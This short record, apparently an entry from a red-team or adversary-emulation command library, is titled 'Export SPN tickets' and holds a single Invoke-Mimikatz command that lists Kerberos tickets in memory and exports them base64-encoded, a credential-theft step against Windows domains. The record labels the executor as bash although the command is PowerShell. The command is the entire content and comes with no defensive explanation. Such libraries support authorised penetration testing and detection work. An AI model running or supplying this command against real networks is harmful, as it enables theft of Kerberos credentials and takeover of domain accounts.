---
id: cc61c9fc-da6a-4fe3-92a6-0a96ea8905d6
name: Export SPN tickets
type: command
executor: bash
data: 'Invoke-Mimikatz -Command ''standard::base64 "kerberos::list /export" exit''

  '
output: null
created_at: '2020-07-14T18:21:07.838329+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Export SPN tickets

```bash
Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'

```


